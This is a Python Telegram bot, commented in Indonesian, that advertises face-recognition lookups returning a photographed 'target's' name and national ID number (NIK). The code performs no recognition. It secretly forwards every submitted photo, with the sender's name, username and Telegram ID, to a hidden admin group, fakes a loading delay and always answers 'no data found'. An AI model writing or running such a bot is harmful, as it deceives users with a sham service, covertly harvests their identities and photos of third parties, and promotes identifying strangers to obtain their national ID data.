import os
import asyncio
import logging
from datetime import datetime
from dotenv import load_dotenv

from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

# 1. Setup Logging (Penting untuk melihat error di terminal)
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# 2. Load Environment Variables
load_dotenv()

TOKEN = os.getenv("BOT_TOKEN")

# Fungsi untuk membersihkan dan mengambil ID Grup Admin
def get_admin_id():
    raw_id = os.getenv("ADMIN_GROUP_ID")
    if not raw_id:
        print("❌ ERROR: ADMIN_GROUP_ID tidak ditemukan di .env!")
        return None
    try:
        # Menghapus spasi atau karakter aneh yang mungkin terselip
        clean_id = raw_id.strip()
        return int(clean_id)
    except ValueError:
        print(f"❌ ERROR: Format ADMIN_GROUP_ID di .env salah: {raw_id}")
        return None

ADMIN_GROUP_ID = get_admin_id()

WELCOME_TEXT = """
*SELAMAT DATANG*

*BOT FR TESTING*
(KUOTA 10/DAY)

*CARA PENGGUNAAN BOT*
1. Kirim foto target tampak depan dan jelas.
2. Tunggu pengecekan sistem (estimasi 10 menit).
3. Bot akan menampilkan Nama, NIK, dan Akurasi.
4. Jam Operasional: *06.00 - 21.00 WIB*.

Selamat bertugas!
"""

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(WELCOME_TEXT, parse_mode='Markdown')

async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Cek Jam Operasional
    now = datetime.now().hour
    if now < 6 or now > 21:
        await update.message.reply_text("⚠️ Server sedang offline\nJam operasional 06.00 - 21.00 WIB")
        return

    # Ambil Informasi User
    user = update.message.from_user
    photo_file_id = update.message.photo[-1].file_id
    
    # Penanganan jika user tidak punya username agar bot tidak crash
    username = f"@{user.username}" if user.username else "Tidak Ada Username"
    first_name = user.first_name if user.first_name else "User"

    # Pesan untuk Admin
    admin_caption = (
        f"📥 *FOTO MASUK*\n\n"
        f"👤 *Nama:* {first_name}\n"
        f"🆔 *Username:* {username}\n"
        f"🔢 *User ID:* `{user.id}`"
    )

    # --- PROSES KIRIM KE GRUP ADMIN ---
    try:
        await context.bot.send_photo(
            chat_id=ADMIN_GROUP_ID,
            photo=photo_file_id,
            caption=admin_caption,
            parse_mode='Markdown'
        )
        print(f"✅ Berhasil meneruskan foto dari {first_name} ke grup admin.")
        
    except Exception as e:
        # Jika gagal, detail error akan muncul di Terminal/CMD Anda
        print(f"❌ GAGAL KIRIM KE ADMIN: {e}")
        await update.message.reply_text("❌ Gagal mengirim data ke server admin. Pastikan bot sudah berada di grup.")
        return

    # --- RESPON KE USER ---
    await update.message.reply_text(
        "📥 Foto diterima\n\n⏳ Sistem sedang melakukan pengecekan FR..."
    )

    # Simulasi proses loading
    await asyncio.sleep(5)

    result_text = (
        "*HASIL PENGECEKAN FR*\n\n"
        "Nama : DATA TIDAK DITEMUKAN\n"
        "NIK  : -\n"
        "Kemiripan : 0%\n\n"
        "STATUS : *TIDAK ADA DATA*"
    )
    
    await update.message.reply_text(result_text, parse_mode='Markdown')

# Inisialisasi Aplikasi
if __name__ == '__main__':
    if not TOKEN or not ADMIN_GROUP_ID:
        print("❌ Bot tidak bisa jalan. Periksa file .env Anda!")
    else:
        app = ApplicationBuilder().token(TOKEN).build()

        app.add_handler(CommandHandler("start", start))
        # Pastikan filter hanya menangkap FOTO
        app.add_handler(MessageHandler(filters.PHOTO, handle_photo))

        print(f"Bot sedang berjalan... (Admin ID: {ADMIN_GROUP_ID})")
        app.run_polling()
